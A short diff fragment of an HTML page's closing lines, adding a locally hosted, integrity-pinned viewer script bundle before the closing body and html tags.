+<script data-precache src="/assets/viewer/bundle.min.13800f940d1d83422ff174b45ece49c4c58a17a608fe79bdba39aec874d4c7fe.js" integrity="sha256-E4APlA0dg0Iv8XS0Xs5JxMWKF6YI/nm9ujmuyHTUx/4=" crossorigin="anonymous" defer></script>
+
+
+  </body>
+</html>
